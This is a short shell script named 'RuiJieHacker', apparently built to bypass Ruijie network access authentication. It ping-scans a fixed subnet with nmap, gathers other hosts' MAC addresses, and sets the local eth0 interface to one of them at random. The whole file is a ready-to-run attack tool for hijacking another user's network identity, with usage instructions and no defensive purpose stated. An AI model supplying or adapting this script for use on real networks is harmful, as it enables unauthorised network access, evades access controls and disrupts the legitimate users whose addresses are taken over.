#! /usr/bin/sh
##############################################################
# Project Name : RuiJieHacker                                         
# Author: luoweifeng1989                                              
# Date: 2011-4-23                                                     
# All Rights Reserved. 
# Usage: bash ./HackerV1.0.sh
##############################################################

declare -a macs
##############################################################
[ ! -e /usr/bin/nmap ] && `sudo apt-get install nmap > /dev/null 2>&1`
##############################################################
[ ! -e /usr/bin/awk ] && `sudo apt-get install awk > /dev/null 2>&1`
##############################################################
macstmp=`sudo /usr/bin/nmap -sP 172.29.132.* | grep 'MAC' | awk '{print $3}' -`

##############################################################
sudo /sbin/ifconfig eth0 down
##############################################################
for mac in $macstmp 
do
	macs[$i]=$mac
	(( i++ ))
done
##############################################################
(( random=$RANDOM % ${#macs[@]} ))
sudo /sbin/ifconfig eth0 hw ether ${macs[$random]}
##############################################################
sudo /sbin/ifconfig eth0 up